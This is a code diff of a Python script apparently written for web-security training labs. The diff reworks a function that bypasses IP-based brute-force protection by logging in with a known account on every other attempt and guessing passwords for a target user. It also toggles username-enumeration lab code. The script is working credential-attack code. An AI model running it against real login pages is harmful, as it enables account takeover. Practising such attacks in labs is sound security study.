@@ -324,26 +324,30 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
     """
     verify_setting = ca_cert_path if ca_cert_path else False
     proxies = get_proxies()
-    headers, data = generate_random_session(valid_user, valid_password, url)
+    headers, valid_user_cred = generate_random_session(valid_user, valid_password, url)
     passwords = load_password_list()
-        
+    
+    counter = 0 
+    
     for password in passwords:
-        # Step 1: Login with credentials to reset brute-force counter
-        print(f"Logging in with your account: {valid_user}")
-        data_yours = {"username": valid_user, "password": valid_password}
-        response_yours = session.post(
-            url, data=data_yours, 
-            headers=headers, 
-            proxies=proxies, 
-            cookies=cookies, 
-            verify=verify_setting, 
-            allow_redirects=False
-        )
+        
+        if counter % 2 == 0:
+            # Step 1: Login with credentials to reset brute-force counter
+            print(f"Logging in with your account: {valid_user}")
+            response_yours = session.post(
+                url, data=valid_user_cred, 
+                headers=headers, 
+                proxies=proxies, 
+                cookies=cookies, 
+                verify=verify_setting, 
+                allow_redirects=False
+            )
 
-        if response_yours.status_code == 302:
-            print(f"Your account login successful for {valid_user}. Brute-force counter reset.")
-        else:
-            print(f"Failed to log in with your account {valid_user}. Check your credentials or session.")
+            if response_yours.status_code == 302:
+                print(f"Your account login successful for {valid_user}. Brute-force counter reset.")
+            else:
+                print(f"Failed to log in with your account {valid_user}. Check your credentials or session.")
+                break
 
         # Step 2: Attempt to brute-force target username with current password
         print(f"Brute-forcing target account: {username_target} with password: {password}")
@@ -365,7 +369,8 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
             print("Server detected brute force. Restarting with a valid login.")
 
         # time.sleep(random.uniform(1, 2)) # Delay btw requests if desired for additional obfuscation
-
+        counter += 1
+        
     print("Brute-force attack completed. No valid password found.")
     return None
         
@@ -385,11 +390,11 @@ def main():
 
 
     ### START: Lab -- Broken brute-force protection, IP block ###
-    # valid_user = "wiener"
-    # valid_password = "peter"
-    #
-    # username_target = "carlos"
-    # alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target)
+    valid_user = "wiener"
+    valid_password = "peter"
+    
+    username = "carlos"
+    alternating_brute_force(url, session, cookies, valid_user, valid_password, username)
     ### END: Lab -- Broken brute-force protection, IP block  ###
 
 
@@ -399,8 +404,8 @@ def main():
     ###  END: Lab -- Username enumeration via response timing ###
     
     ### START: Lab -- Username enumeration via account lock ###
-    dummy_password = "howdy"
-    username = find_username_account_lock(url, session, cookies, dummy_password, ca_cert_path)
+    # dummy_password = "howdy"
+    # username = find_username_account_lock(url, session, cookies, dummy_password, ca_cert_path)
     ### END: Lab -- Username enumeration via account lock ###
     
     # username = ""
